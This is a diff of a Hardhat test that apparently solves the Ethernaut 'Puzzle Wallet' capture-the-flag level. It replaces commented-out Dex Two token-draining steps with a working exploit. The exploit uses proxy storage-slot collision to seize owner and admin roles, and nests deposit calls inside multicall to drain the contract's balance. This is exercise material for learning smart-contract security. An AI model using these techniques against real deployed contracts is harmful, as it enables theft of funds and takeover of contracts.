@@ -12,30 +12,40 @@ it("Solves 24-Puzzle", async function () {
   const challenge = await getChallenge();
   const challengeAddress = await challenge.getAddress();
 
-  // // Build two dummy tokens to swap for the 2 tokens we really want.
-  // const factory = await ethers.getContractFactory("DexTwoAttackerToken");
-  // const attackerToken1 = await factory.deploy("name", "symbol", 1000000000);
-  // await attackerToken1.waitForDeployment();
-  // const attackerToken1Address = await attackerToken1.getAddress();
-  // const attackerToken2 = await factory.deploy("name2", "symbol2", 1000000000);
-  // await attackerToken2.waitForDeployment();
-  // const attackerToken2Address = await attackerToken2.getAddress();
+  const [eoa] = await ethers.getSigners();
+  const eoaAddress = await eoa.getAddress();
+  const interface = (await ethers.getContractFactory("PuzzleWallet")).interface;
 
-  // const token1Address = await challenge.token1();
-  // const token2Address = await challenge.token2();
+  // Using `ethers.provider.call()` or `eoa.send()` are all non-state-changing calls, similar to `staticCall()`
+  // For state-changing calls, should use `sendTransaction()` instead.
 
-  // // Approve dex to spend all our tokens.
-  // await challenge.approve(challengeAddress, 1000000);
-  // await attackerToken1.approve(challengeAddress, 1000000);
-  // await attackerToken2.approve(challengeAddress, 1000000);
+  // Step 1: Modify slot 0 to modify the `owner` in Wallet contract.
+  await challenge.proposeNewAdmin(eoaAddress);
 
-  // // Drain token1
-  // await attackerToken1.transfer(challengeAddress, 100);
-  // await challenge.swap(attackerToken1Address, token1Address, 100);
+  // Step 2: Add eoa to whitelist.
+  await eoa.sendTransaction({
+    to: challengeAddress,
+    data: interface.encodeFunctionData("addToWhitelist", [eoaAddress])
+  });
 
-  // // Drain token2
-  // await attackerToken2.transfer(challengeAddress, 100);
-  // await challenge.swap(attackerToken2Address, token2Address, 100);
+  // Step 3: Deposit 2 times and withdraw once. Wrap one of the deposits in a multicall to bypass the deposit once check.
+  // This is to fulfill the contract balance == 0 check.
+  const depositCallData = interface.encodeFunctionData("deposit", []);
+  const wrappedDepositCallData = interface.encodeFunctionData("multicall", [[depositCallData]]);
+  const executeCallData = interface.encodeFunctionData("execute", [eoaAddress, ethers.parseEther("0.002"), "0x"]);
+  const multiCallData = interface.encodeFunctionData("multicall", [[depositCallData, wrappedDepositCallData, executeCallData]]);
 
-  // expect(await submitLevel(await challenge.getAddress())).to.equal(true);
+  await eoa.sendTransaction({
+    to: challengeAddress,
+    data: multiCallData,
+    value: ethers.parseEther("0.001"),
+  });
+
+  // Step 4: Simply set the admin by `setMaxBalance` because they share the same slot 1.
+  await eoa.sendTransaction({
+    to: challengeAddress,
+    data: interface.encodeFunctionData("setMaxBalance", [BigInt(eoaAddress)]),
+  });
+
+  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
 });
